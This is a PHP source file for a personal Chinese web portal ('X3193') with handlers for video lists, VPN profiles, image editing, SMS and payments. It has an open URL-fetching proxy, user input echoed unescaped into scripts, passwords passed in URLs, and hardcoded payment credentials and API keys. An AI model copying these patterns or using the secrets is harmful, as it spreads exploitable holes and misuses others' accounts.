	break;	
	    case "fileupdate":
        fileupdate();
	break;	
	    case "randwork":
        randwork();
	break;	
    case "stickam":
        stickam();
	break;        
    case "vchat":
        stickam();
	break;
    case "lcid":
        LCIDS();
	break;
    case "picasa":
        google();
	break;
    case "webtv":
        zqredstar();
	break;
    case "calendar":
        google();
	break;
    case "docin":
        docin();
	break;
    case "editor":
        editor();
	break;
    case "tts":	
				itri();
	break;				
    case "imap":
        imap();
	break;
    case "setup":
        setup();
	break;
    case "pinyin":
        echo Pinyin(trim(request("pinyin")),getcharset(),true,"cn");
	break;
    case "unicode":
        echo str_to_unicode(trim(request("unicode")),getcharset());
	break;
    case "tudou":
        tudou();
	break;
    case "vedio":
        tudou();
	break;
    case "pm":
        perfectmoney();
	break;
    case "baidu":
        baidu();
	break;	
    case "cdndown":
        $url = parse_url(trim(request('fileurl')));	
        cdndown(basename($url['path']));
	break;	
    default:
        if (0){
        }       
        elseif (substr(trim($_SERVER['SERVER_NAME']),1,6) == "mobile"){
        	//redirect(scriptpath()."?api=mobile");
        	//echo 'ffff';
        	break;
        }       
        else{
                //mail('xcy6272003@126.com','x3193@web.x3193.cz.cc',$emailcontent.'server'.$_SERVER['REMOTE_HOST'].'IP:'.$_SERVER['REMOTE_ADDR'].strlen($_SERVER['REMOTE_ADDR']).'cliet:'.$_SERVER['SERVER_NAME'].'nr:'.'index.php'.' or '.$xmlstr.file_get_contents('php://stdin').time());
        } 

        bing();	
        //gmap2();
	break;
}


session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
}

$runtime= new runtime;
echo "加载时间: ".round($runtime->get_microtime()-$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['runime']['start'],3)." 秒";

?>

<?php
function cdndown($filename){

        header('Content-Type:application/octet-stream');
        header('Content-Disposition: attachment; filename="'.$filename.'"');

        $pathurl = trim(request('fileurl'));
        //header('Content-Type:application/x-shockwave-flash');
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $pathurl);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
        $xmlstr = curl_exec($ch);
        curl_close($ch);
				echo $xmlstr;      
}
?>


<?php
function randwork(){
$max = '1000';
$rate  = trim(request('rate'))?trim(request('rate')):'0.5';
$rand = rand(1,$max);
if($rand < $rate*$max){
	$result = 'A';
}elseif($rand > $rate*$max){
	$result = 'B';
}
	//return $result;
	echo 'The result is : '.$result.' - ['.$rand.':1~'.$max.':'.$rate.']'; 
	if(date('H',time())=='19'||date('H',time())=='13'){
		//$voxeo = new voxeo_class();
  	//$voxeo->voxeosendsms('8615998963077','The result is : '.$result.' - ['.$rand.':1~'.$max.':'.$rate.']');  
	}      
}
?>

<?php
function fileupdate(){
$filedir = 'haodai|net2ftp|phono|wordpress|noVNC-master';
$dirlist = split("[|]",$filedir);
$filename = 'diy.php|phpinfo.php|filebox.php';
$filelist = split("[|]",$filename);
for($i=0;$i<count($dirlist);$i++){
	for($j=0;$j<count($filelist);$j++){
		passthru("cp ".$filelist[$j]." ./".$dirlist[$i]."/".$filelist[$j],$result);
		echo $result.'<br>';
	}
}
}
?>

<?php 
function fetion(){
$fetion = new fetion_class();
$getaccesstoken=$fetion->getaccesstoken();
echo $getaccesstoken['access_token'].' ';
$getuseropenid=$fetion->getuseropenid($getaccesstoken['access_token'],'');
print_r($getuseropenid['data']['openid'][0].' ');
$sendtextmsg=$fetion->sendtextmsg($getaccesstoken['access_token'],$getuseropenid['data']['openid'][0],'lswii');
print_r($sendtextmsg);
?>	

<?php 	
}
function checkSignature()
{
        $signature = $_GET["signature"];
        $timestamp = $_GET["timestamp"];
        $nonce = $_GET["nonce"];	
        		
	$token = '510212198004250318';
	$tmpArr = array($token, $timestamp, $nonce);
	sort($tmpArr, SORT_STRING);
	$tmpStr = implode( $tmpArr );
	$tmpStr = sha1( $tmpStr );
	
	if( $tmpStr == $signature ){
		return true;
	}else{
		return false;
	}
}


?>

<?php 
function baidu(){
?>	
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<title></title>
<script type="text/javascript" name="baidu-tc-cerfication" data-appid="5791192" src="http://apps.bdimg.com/cloudaapi/lightapp.js"></script>
<style type="text/css">
	html, body { height:100%; overflow:hidden; }
	body { margin:0; }
</style>
</head>
<body>

</body>
</html>
<?php 	
}
?>


<?php 
function meitu(){
header('Content-Type: text/html; charset=gb2312');
?>	
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<title>美图WEB开放平台</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script src="http://open.web.meitu.com/sources/xiuxiu.js" type="text/javascript"></script>
<script type="text/javascript">
window.onload=function(){
  xiuxiu.embedSWF("altContent",3,"100%","100%");
  /*第1个参数是加载编辑器div容器，第2个参数是编辑器类型，第3个参数是div容器宽，第4个参数是div容器高*/
  xiuxiu.setUploadURL("<?php echo trim(request('uploadurl'))?>");//修改为上传接收图片程序地址
  xiuxiu.onInit = function ()
  {
    xiuxiu.loadPhoto("<?php echo trim(request('picurl'))?>");//修改为要处理的图片url
  }
  xiuxiu.onUploadResponse = function (data)
  {
    //alert("上传响应" + data); 可以开启调试
  }
}
</script>
<style type="text/css">
	html, body { height:100%; overflow:hidden; }
	body { margin:0; }
</style>
</head>
<body>
<div id="altContent">
	<h1>美图秀秀</h1>
</div>
</body>
</html>
<?php 	
}
?>

<?php 
function discuz(){
header('Content-Type: text/html; charset=gb2312');

switch (trim(request('action'))) {
         				case "ths":
               	?>

<div align="center">
<iframe id="ths" name="ths" frameborder="0" src="http://www.10jqka.com.cn/flash/" width="100%"  height="550px" scrolling="no">同花顺flash股市行情</iframe>
</div> 
            	
               	<?php 
               	break; 
               	case "meitu":
               	?>
<div align="center">
<iframe id="meitu" name="meitu" frameborder="0" src="<?php echo scriptpath();?>?api=meitu" width="100%"  height="550px" scrolling="no"></iframe>
</div>        	
               	<?php  
               	break;
               	case "zhibo":
               	?>

<div align="center">
<iframe id="TV123456789" name="TV123456789" frameborder="0" src="http://www.tv123456789.com/live.asp" width="100%"  height="550px" scrolling="no">TV123456789汇集所有卫星电视网络电视在线直播</iframe>
</div> 
            	
               	<?php 
               	break; 
               	case "meitu":
               	?>
<div align="center">
<iframe id="meitu" name="meitu" frameborder="0" src="<?php echo scriptpath();?>?api=meitu" width="100%"  height="550px" scrolling="no"></iframe>
</div>                	
               	<?php              	             	
               	break; 
               	case "bing":
								bing();           	             	
               	break;                	
        default:
        
               	break;
}

}
?>

<?php 
function wiqet(){ // idoll function start
header('Content-Type: text/html; charset=gb2312');
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 多媒体");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="120%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|域名|FTP|读书|游戏|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<table width="95%" height="89%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr align="top" style="border:0">
                <td align="top" id="Picnik">
<!--Load javascript library from Wiqet server-->
<script type="text/javascript" src="http://www.wiqet.com/wiqetapi/?api_key=baf4881253197349f6022d6f9cbac783"></script>
<script type="text/javascript">
/**
          Photo editor
        */
        var photo = new wiqet.photo.Editor('wiqetphoto', {
               'wiqetCode':           ''  //wiqet code only when you want to edit a Wiqet
            ,  'uniqueId':       '1'       //id to identify a user, defined by you
          } 
          , {
              //default flashplayer properties
              'width':              '450px'
            , 'height':             '375px'
            , 'bgcolor':            '#FFFFFF'
            , 'align':              'middle'
            , 'allowScriptAccess':  'always'
        }, 'callback');
</script>
<div id="wiqetphoto">Wiqet is loading.....</div>
<script type="text/javascript">
//function that is used to save the Wiqet information in your database
function callback(wiqetCode) {
       alert(wiqetCode);
      //Implement javascript that saves the data to your database and if necesarry do a redirect.
    }
</script>
<?php 
$style->footer();
//exit;
} // idoll function end
?>

<?php 
function tropo(){
?>	
{
   "tropo":[{"say":{"value":"Guess what? http://www.phono.com/audio/troporocks.mp3"}}]
}
<?php 	
}
?>

<?php 
function filemanager(){

}
?>

<?php 
function tel(){
	print_r($_SERVER);
}
?>

<?php 
function IVR(){
		$ivrflag == '';
		$voxeo = new voxeo_class();
		while($ivrflag != 'ok'){
			//$voxeo = new voxeo_class();
			$dialresult = $voxeo->OutboundDialing(trim(request('phone')));
			$ivrflag = $dialresult['result'];
		}	
		print_r($ivrflag);	
}
?>

<?php 
function fpdf(){
//$pdf=new PDF_Chinese();
//$pdf->AddBig5Font();
//$pdf->AddPage();
//$pdf->SetFont('Big5','',20);
//$pdf->Write(10,'{僧鸱 18 C 楞 83 %');
//$pdf->Output();

$pdf=new PDF_Chinese(); 
$pdf->AddGBFont(); 
$pdf->AddPage(); 
$pdf->SetFont('GB','',20); 
$pdf->Write(10,'简体中文汉字'); 
$pdf->Output(); 
}
?>

<?php 
function perfectmoney(){
$f=fopen('https://perfectmoney.com/acct/balance.asp?AccountID=652469&PassPhrase=EUIfgwe7', 'rb');

if($f===false){
   echo 'error openning url';
}

// getting data
$out=array(); $out="";
while(!feof($f)) $out.=fgets($f);
print_r($out) ;
fclose($f);

// searching for hidden fields
if(!preg_match_all("/<input name='(.*)' type='hidden' value='(.*)'>/", $out, $result, PREG_SET_ORDER)){
   echo 'Ivalid output';
   exit;
}

// putting data to array
$ar="";
foreach($result as $item){
   $key=$item[1];
   $ar[$key]=$item[2];
}

echo '<pre>';
print_r($ar);
echo '</pre>';
}
?>

<?php 
function vpn(){
$sCrLf = chr(13) . chr(10);
$regsite = 'www.raptorvpn.com';
$vpnserver = 'spotflux.x3193.cu.cc';
session_start();
switch (trim(request('action'))) {  // case start
    	case "code":
		?>
[X3193 USAIP VPN]
[USAIP PPTP <?php echo trim(request("vpnname"));?>]
Encoding=0
Type=2
AutoLogon=0
UseRasCredentials=1
DialParamsUID=172546
Guid=7106BE987679AF4B8258EFCCADA692A5
BaseProtocol=1
VpnStrategy=1
ExcludedProtocols=2
LcpExtensions=1
DataEncryption=8
SwCompression=1
NegotiateMultilinkAlways=1
SkipNwcWarning=0
SkipDownLevelDialog=0
SkipDoubleDialDialog=0
DialMode=1
DialPercent=75
DialSeconds=120
HangUpPercent=10
HangUpSeconds=120
OverridePref=15
RedialAttempts=99
RedialSeconds=30
IdleDisconnectSeconds=0
RedialOnLinkFailure=0
CallbackMode=0
CustomDialDll=
CustomDialFunc=
CustomRasDialDll=
AuthenticateServer=0
ShareMsFilePrint=1
BindMsNetClient=1
SharedPhoneNumbers=0
GlobalDeviceSettings=0
PrerequisiteEntry=
PrerequisitePbk=
PreferredPort=VPN2-0
PreferredDevice=WAN Miniport (L2TP)
PreferredBps=0
PreferredHwFlow=1
PreferredProtocol=1
PreferredCompression=1
PreferredSpeaker=1
PreferredMdmProtocol=0
PreviewUserPw=1
PreviewDomain=0
PreviewPhoneNumber=0
ShowDialingProgress=1
ShowMonitorIconInTaskBar=1
CustomAuthKey=-1
AuthRestrictions=544
TypicalAuth=2
IpPrioritizeRemote=1
IpHeaderCompression=0
IpAddress=0.0.0.0
IpDnsAddress=0.0.0.0
IpDns2Address=0.0.0.0
IpWinsAddress=0.0.0.0
IpWins2Address=0.0.0.0
IpAssign=1
IpNameAssign=1
IpFrameSize=1006
IpDnsFlags=0
IpNBTFlags=1
TcpWindowSize=0
UseFlags=0
IpSecFlags=1
IpDnsSuffix=

NETCOMPONENTS=
ms_server=1
ms_msclient=1
ms_psched=1
ms_nwsapagent=1
ms_nwclient=1
ms_pacer=1
cfosspeed=1
odysseyim4=1
vmware_bridge=1

MEDIA=rastapi
Port=VPN2-0
Device=WAN <?php echo iconv('gb2312','utf-8','微型端口')?> (L2TP)
DEVICE=vpn
PhoneNumber=<?php echo trim(request("servername")).$sCrLf;?>  
AreaCode=
CountryCode=98
CountryID=98
UseDialingRules=0
Comment=
LastSelectedPhone=0
PromoteAlternates=0
TryNextAlternateOnFail=1		
		<?php 
      		break;
    	case "download": 
      If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
        if (trim(request("checkcode")) != ""){
         	AlertBack("四位验证码错误！" , 1);
        	break;
        }       
        elseif (trim(request("checkcode")) == ""){
         AlertBack("四位验证码为空！" , 1);
         break;
      	}               
      } 
      if (trim(request("servername")) == "" || trim(request("vpnname")) == ""){
        AlertBack("服务器或连接名为空！" , 1);
        break;
      }
	else{
      		header('Content-Type:application/octet-stream');
		header('Content-Disposition: attachment; filename="raptorvpn.com.pbk"');
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, httppath().'?api=vpn&action=code&vpnname='.trim(request("vpnname"))."&servername=".trim(request("servername")));
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			//curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
			curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
			$xmlstr = curl_exec($ch);
			curl_close($ch);
			echo $xmlstr;
		}	
      		break;	
      	default:
session_start();
$skincolor = selstyle(trim(request("skin")));

$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - VPN");
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|域名|FTP|读书|游戏|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

$tag = New TagAction(); 
      	
          $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="google">
                        <form action="<?php echo ScriptPath();?>?api=vpn&action=<?php  echo encodeuri("download");?>&skin=<?php  echo $skincolor;?>" method="post" name="vpn">
                        &nbsp服务器域名：<input type="text" class="text" name="servername" value="<?php echo $vpnserver;?>" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
                        &nbsp网络连接名：<input type="text" class="text" name="vpnname" value="<?php echo strtoupper($regsite);?>" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
                        &nbsp验证码：<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
               </td>
        </tr>   
</table>
<?php    
					$style->footer(); 
          break; 
}
//exit;  
}    		
?>

<?php 
function tudou(){
header('Content-Type: text/html; charset=gb2312');
IF(is_wap()){
?>
<!DOCTYPE html 
     PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<?php 
}
$skincolor = selstyle(trim(request("skin")));

$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 视频");
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" height="30" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="left" style="border:0;<?php $style->selcolor($skincolor,'tdbg');?>">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0;<?php $style->selcolor($skincolor,'tdbg');?>">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|域名|FTP|游戏|视频|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|视频",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 30)
        $pagesize = 30;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

$tag = New TagAction(); 

switch (trim(request("action"))){
        case "media.list":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}                         

                        $_SESSION["tudou"] = array('uname' => '', 'pwd' => '');                 
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action"))));
                        break;
                }
                elseif ($_SESSION["tudou"]["uname"] != "" && $_SESSION["tudou"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["tudou"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["tudou"]["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode")));
                        break;
                }               
                elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }
                        
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}                        

                        $_SESSION["tudou"]=array('uname' => base64_decode(trim(request("uname"))), 'pwd' => base64_decode(trim(request("pwd"))));
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode")));
                        break;
                }       
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode")));
                        break;
                }               
                break;
        case "media.ulist":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}                        

                        $_SESSION["tudou"] = array('uname' => '', 'pwd' => '');                 
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action"))));
                        break;
                }
                elseif ($_SESSION["tudou"]["uname"] != "" && $_SESSION["tudou"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["tudou"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["tudou"]["pwd"])))."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode")));
                        break;
                }               
                elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                			
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>" > 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        								break;
                                      
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                			
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>" > 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        								break;
             										}
                        }

                        
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}
                        $_SESSION["tudou"]=array('uname' => base64_encode(trim(request("uname"))), 'pwd' => base64_encode(trim(request("pwd"))));
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode")));
                        break;
                }       
                elseif ($_SESSION["tudou"]["uname"] == "" && $_SESSION["tudou"]["pwd"] == "" ){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode")));
                        break;
                }               
               	$tudou_media = new tudou_class();
               	$mediaulist = $tudou_media->tudoumediaulist(Base64_decode(trim($_SESSION["tudou"]["uname"])),$page,$pagesize);
                //print_r($mediaulist);
	        if ($mediaulist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mediaulist['length'];
                ?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="25%" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> [ <a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>用户</a> - <?php echo Base64_decode(trim($_SESSION["tudou"]["uname"]));?> <?php  if (trim($_SESSION["tudou"]["uname"]) != "" && trim($_SESSION["tudou"]["pwd"]) != "") {?> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1";?>" target="_self">退出</a><?php  } ?> ] </td>
								<td align="center" colspan="3" width="50%" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 查 询 结 果 : 共 <?php echo $mediaulist['length'];?> 条 </td>
								<td align="left" colspan="3" width="25%" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"></td>
        </tr>
</table>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="live" method="POST" action="">
                <?php 
                $totalitem = $mediaulist['length'];
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }                       
                ?>
        <tr class="tdbg" height="30" >

                <td align="center" width=20% style="<?php $style->selcolor($skincolor,'tdbg');?>">
                        标题
                </td>
                <td align="center" width=15% style="<?php $style->selcolor($skincolor,'tdbg');?>">
                        标签
                </td>
                <td align="center" width=15% style="<?php $style->selcolor($skincolor,'tdbg');?>">
                        用户名（昵称/ID）
                </td>
                <td align="center" width=20% style="<?php $style->selcolor($skincolor,'tdbg');?>">
                        <a style="" href="<?php echo ScriptPath()."?api=tudou&action=".encodeuri('media.search')."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">搜索</a> <a style="" href="<?php echo ScriptPath()."?api=tudou&action=".encodeuri('media.create')."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">上传</a>
                </td> 
        </tr>
                <?php 
                for($i = 0; $i < $strpagesize; $i++){
                        $mediatitle = $mediaulist[$i]['mediatitle'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('domainName')->item(0)->nodeValue);
                        $mediatags = $mediaulist[$i]['mediatags'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('active')->item(0)->nodeValue);
                        $mediaownername = $mediaulist[$i]['mediaownername'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('numUsers')->item(0)->nodeValue);
                        $mediaownernickname = $mediaulist[$i]['mediaownernickname'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('maxUsers')->item(0)->nodeValue);
                        $mediaownerid = $mediaulist[$i]['mediaownerid'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('maxUsers')->item(0)->nodeValue);
                        $mediaplayerurl = $mediaulist[$i]['mediaplayerurl'];
                        $mediaitemurl = $mediaulist[$i]['mediaitemurl'];
                        $mediatype = $mediaulist[$i]['mediatype'];
                        $mediadescription = $mediaulist[$i]['mediadescription'];
                        $mediapicurl = $mediaulist[$i]['mediapicurl'];
                        $mediatime = $mediaulist[$i]['mediatime'];
                        $mediacreatetime = $mediaulist[$i]['mediacreatetime'];
                        $mediaclass = $mediaulist[$i]['mediaclass'];
                        $mediachecked = $mediaulist[$i]['mediachecked'];
                        $mediaitemcode = $mediaulist[$i]['itemCode'];                        
                        ?>
        <tr class="<?php echo $i%4==3?'tdbg':'';?>">

                <td align="center" style="<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>" height="30" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';">
                <?php 
                        $tudou_media = new tudou_class();
               		$mediaviewer = $tudou_media->tudouviewer();
               		if($mediaviewer){
                ?>
                        <?php echo "<a style=\"\" href=\"".$mediaitemurl."\">".$mediatitle."</a>";?>
                <?php 
			}
               		else{
                ?>
                        <?php echo "<a style=\"\" href=\"".ScriptPath()."?api=tudou&action=".encodeuri("media.view")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mediacode=".encodeuri($mediaitemcode)."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".encodeuri($page)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."\">".$mediatitle."</a>";?>
                <?php                		
               		}
                ?>                        
                </td>
                <td align="center" style="<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';">
